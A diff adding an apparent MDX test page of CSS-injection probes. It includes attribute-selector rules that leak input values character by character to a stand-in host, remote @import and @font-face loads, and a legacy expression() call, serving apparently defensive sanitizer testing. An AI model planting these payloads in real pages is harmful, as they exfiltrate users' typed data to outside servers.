@@ -1,0 +1,45 @@
+---
+title: CSS & Style Injection Tests
+subtitle: Testing CSS-based data exfiltration and injection
+slug: css-injection
+---
+
+## CSS Injection via MDX
+
+### S1: Inline Style with Background URL
+<div style={{backgroundImage: "url('https://example.com/probe?css-inject=1')"}}>CSS Background Probe</div>
+
+### S2: Style Tag with @import
+<style>{`@import url('https://example.com/evil.css');`}</style>
+
+### S3: Style Tag with Attribute Selector Exfil
+<style>{`
+input[value^="a"] { background: url('https://example.com/leak?char=a'); }
+input[value^="b"] { background: url('https://example.com/leak?char=b'); }
+input[value^="c"] { background: url('https://example.com/leak?char=c'); }
+`}</style>
+
+### S4: CSS Expression (legacy IE)
+<div style={{width: "expression(alert('xss-css-expr'))"}}>CSS Expression</div>
+
+### S5: CSS var() with URL
+<div style={{"--leak": "url('https://example.com/var-leak')"}}>CSS Var Probe</div>
+
+### S6: Keyframe Animation with External Resource
+<style>{`
+@keyframes leak {
+  from { background: url('https://example.com/keyframe-leak?start'); }
+  to { background: url('https://example.com/keyframe-leak?end'); }
+}
+.leak-target { animation: leak 1s; }
+`}</style>
+<div className="leak-target">Keyframe Probe</div>
+
+### S7: Font-face with External URL
+<style>{`
+@font-face {
+  font-family: 'LeakFont';
+  src: url('https://example.com/font-leak.woff2');
+}
+`}</style>
+<span style={{fontFamily: "'LeakFont'"}}>Font Probe</span>
